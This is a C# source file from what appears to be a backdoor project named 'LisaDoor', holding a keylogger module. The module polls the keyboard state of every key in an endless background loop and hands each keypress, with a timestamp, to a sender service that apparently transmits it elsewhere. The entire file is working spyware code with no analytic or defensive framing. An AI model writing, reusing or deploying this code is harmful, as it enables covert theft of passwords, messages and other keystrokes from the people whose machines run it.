using System.Runtime.InteropServices;

namespace LisaDoor
{
    internal class KeyLogger : Module
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        public override void Init()
        {
            Task.Run(() =>
            {
                bool[] writedKeys = new bool[256];
                while (true)
                {
                    for (int i = 0; i < 255; i++)
                    {
                        bool state = GetAsyncKeyState(i) != 0 ? true : false;
                        if (writedKeys[i] != state)
                        {
                            if (state == true)
                            {
                                KLData data = new(DateTime.UtcNow, ((ConsoleKey)i).ToString());
                                SenderService.SendMessage(data);
                            }
                            writedKeys[i] = state;
                        }
                    }
                }
            });
        }
    }
}
